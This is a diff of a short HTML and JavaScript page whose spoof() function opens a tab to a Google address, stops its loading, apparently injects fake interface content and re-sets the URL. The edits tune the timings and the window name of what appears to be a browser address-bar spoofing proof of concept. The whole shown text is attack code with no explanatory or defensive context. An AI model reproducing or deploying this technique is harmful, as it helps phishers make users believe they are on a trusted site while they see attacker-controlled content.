@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="spoof()">CLICK HERE</button>
+<button onclick="spoof()">CLICK HERE HERE</button>
 
 <script>
 function spoof() {
 
     // 1) open new tab, MUST be user interaction
-    let win = window.open("https://www.google.com:8080", "_blank");
+    let win = window.open("https://www.google.com:8080", "https://www.google.com:8080");
 
     if(!win) return alert("Please allow popups");
 
     // 2) early stop to freeze navigation
     setTimeout(() => {
         try { win.stop(); } catch(e){}
-    }, 2000);
+    }, 10000);
 
     // 3) inject fake UI
     setTimeout(() => {
@@ -37,7 +37,7 @@ function spoof() {
     // 4) minor URL enforcement
     setTimeout(()=>{
         try{ win.location.href = "https://www.google.com:8080"; }catch(e){}
-    }, 4000);
+    }, 10);
 
 }
 </script>
